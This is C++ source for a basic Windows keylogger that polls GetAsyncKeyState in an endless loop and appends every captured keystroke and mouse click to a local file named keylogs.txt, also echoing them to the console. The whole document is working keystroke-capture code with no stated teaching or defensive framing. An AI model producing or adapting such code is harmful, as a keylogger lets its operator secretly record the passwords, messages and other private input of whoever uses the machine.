#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
using namespace std;

void WriteToLog(LPCSTR text)
{
    ofstream logfile;                          //creates object for File stream
    logfile.open("keylogs.txt", fstream::app); //opens file for writing
    logfile << text;                           //Writes text string to file
    logfile.close();                           //close stream
}
bool KeyIsListed(int iKey)
{
    switch (iKey)
    {
    case VK_SPACE:
        cout << " ";                           // if space bar is pressed, print space to console
        WriteToLog(" ");                       // write space to logfile
        break;

    case VK_RETURN:
        cout << "\n";                          // same as above, excapt now 'enter' is couted
        WriteToLog("\n");
        break;

    case VK_SHIFT:
        cout << " *Shift* ";
        WriteToLog(" *Shift* ");
        break;

    case VK_BACK:
        cout << "\b";                         //emulates backspace
        WriteToLog("\b");
        break;

    case VK_RBUTTON:
        cout << " *rclick* ";                //emulates backspace
        WriteToLog(" *rclick* ");
        break;

    case VK_LBUTTON:
        cout << " *lclick* "; //emulates backspace
        WriteToLog(" *lclick* ");
        break;

    default: return false; //need later when determine if key exist in this list
    }
}

int main()
{
    char key;
    while (TRUE)
    {
        Sleep(10);
        for (key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                if (KeyIsListed(key) == FALSE)
                {
                    cout << key;
                    ofstream logfile;                          //creates object for File stream
                    logfile.open("keylogs.txt", fstream::app); //opens file for writing
                    logfile << key;                           //Writes logged key char to file
                    logfile.close();                           //close stream
                }
            }
        }
    }
    return 0;
}